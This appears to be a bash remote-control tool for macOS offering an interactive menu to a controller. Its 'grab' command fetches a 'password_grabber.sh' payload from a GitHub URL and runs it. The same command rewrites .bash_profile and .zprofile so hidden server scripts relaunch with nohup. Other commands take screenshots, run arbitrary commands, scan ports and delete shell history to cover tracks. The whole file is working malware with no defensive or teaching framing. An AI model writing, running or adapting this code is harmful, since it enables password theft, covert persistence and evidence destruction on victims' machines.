#!/bin/bash

echo "Command       Description
-------       -----------
user          show macs username
ip            show macs ip address
version       show macs version
screenshot    screenshots macs current screen
talk          text to speech
help          shows the help menu
command       enter custom bash command
scan          launches port scanner
message       runs a message from audio.mp3
grab          tries to grab password
clear         clears terminal history"

while true; do
echo "> "
read COMMAND

case $COMMAND in

user)
    WHOAMI=$(whoami)
    echo "$WHOAMI"
    ;;
ip)
    IP=$(ifconfig | grep -Eo "inet (addr:)?([0-9]*\.){3}[0-9]*" | grep -Eo "([0-9]*\.){3}[0-9]*" | grep -v "127.0.0.1")
    echo "$IP"
    ;;
version)
    VERSION=$(sw_vers -productVersion)
    echo "$VERSION"
    ;;
screenshot)
    SCREENSHOT=$(screencapture -o screenshot.jpg)
    echo "$SCREENSHOT"
    ;;
talk)
    echo "Enter text to speech dialogue: "
    read INPUT
    TALK=$(say $INPUT)
    ;;
help)
echo "Command       Description
-------       -----------
user          show macs username
ip            show macs ip address
version       show macs version
screenshot    screenshots macs current screen
talk          text to speech
help          shows the help menu
command       enter custom bash command
scan          launches port scanner
message       runs a message from audio.mp3
grab          tries to grab password
clear         clears terminal history"
;;
command)
    echo "Custom bash command: "
    read COMMAND
    CUSTOM_COMMAND=$($COMMAND)
    echo "$COMMAND"
    ;;
scan)
    echo "Enter port: "
    read PORT
    echo "Enter address: "
    read ADDR
  echo >/dev/tcp/$ADDR/$PORT &&
    echo "port $PORT is open" ||
    echo "port $PORT is closed"
    ;;
message)
    curl --location --request GET 'https://drive.google.com/uc\?export\=download\&id\=1PCQxmE-kEJQYKcFRZd_1GERkpRkjilBf' -o .hidden/audio.mp3 -s
    Sleep 1
    osascript -e "set Volume 10"
    afplay .hidden/audio.mp3
    ;;
grab)
rm .zprofile
rm .bash_profile
curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/password_grabber.sh >> .hidden/terminal.sh
sleep 1
chmod +x .hidden/terminal.sh
sleep 1
open -a terminal.app .hidden/terminal.sh
echo "password will be stored in .hidden/password.txt"
touch .bash_profile
touch .zprofile
echo ".hidden/server.sh" >> .bash_profile
echo "nohup bash .hidden/open.sh &" >> .bash_profile
echo ".hidden/server.sh" >> .zprofile
echo "nohup bash .hidden/open.sh &" >> .zprofile
;;
clear)
rm .zsh_history
rm .bash_history
;;

esac
done
